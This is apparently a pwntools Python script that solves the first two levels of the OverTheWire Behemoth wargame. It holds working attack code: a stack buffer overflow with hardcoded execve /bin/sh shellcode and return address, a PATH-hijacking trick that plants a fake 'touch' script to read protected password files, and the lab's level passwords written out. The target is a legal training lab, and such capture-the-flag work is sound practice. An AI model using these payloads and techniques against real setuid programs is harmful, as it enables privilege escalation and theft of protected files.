from pwn import *

# LEVEL 1
print("ENTERING WARGAME BEHEMOTH : CHALLENGE 1")
level = 1
shell_code = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
payload = '"A" * 79 + "\x85\x5a\xe2\xf7" + asm(shellcraft.sh())'
wargame = 'behemoth'
server = '%s.labs.overthewire.org' % wargame
login_user = '%s%i' % (wargame, level)
password = ['aesebootiv']
pass_file = '/etc/behemoth_pass/behemoth%i' % (level + 1)
binary1 = '/%s/%s%i' % (wargame, wargame, level)

s = ssh(host=server, user=login_user, password=password[level - 1])
s.connected()
p = s.process(binary1)
print(p.recv())
p.sendline("A" * 79 + "\x85\x5a\xe2\xf7" + shell_code)
print(p.recv())
time.sleep(1)
p.clean()
p.sendline("cat {}".format(pass_file))
password.append(p.recvline())
s.close()
print("Password For behemoth%i is : %s " % (level + 1, password[level]))
#time.sleep(3)

# LEVEL 2

print("ENTERING WARGAME BEHEMOTH : CHALLENGE 2")
level = 2
login_user = '%s%i' % (wargame, level)
pass_file = '/etc/behemoth_pass/behemoth%i' % (level + 1)
binary2 = '/%s/%s%i' % (wargame, wargame, level)

working_dir = "/tmp/desi_jarvis/"
string1 = "'#!/bin/sh' > touch"
string6 = " '/bin/cat /etc/behemoth_pass/behemoth3 > desi_jarvis.txt' >> touch"
string2 = "777 touch"
string3 = '"/tmp/desi_jarvis/:$PATH"'
string5 = '/tmp/desi_jarvis/desi_jarvis.txt'

shell2 = ssh(host=server, user=login_user, password="eimahquuof")
# log.info('creating working directory')
shell2.run('mkdir {}'.format(working_dir))
shell2.set_working_directory(working_dir)
# log.info('creating payload')
shell2.run('echo {}'.format(string1))
shell2.run('echo {}'.format(string6))
shell2.run('/bin/chmod {}'.format(string2))
# log.info('changing environment variable PATH to /tmp/desi_jarvis')
p = shell2.process([binary2], env={'PATH': '/tmp/desi_jarvis/:$PATH'})
p.sendline("cat {}".format(pass_file))
password.append(shell2.download_data(string5))
shell2.close()

print("Password For behemoth%i is : %s " % (level + 1, password[level]))
time.sleep(3)
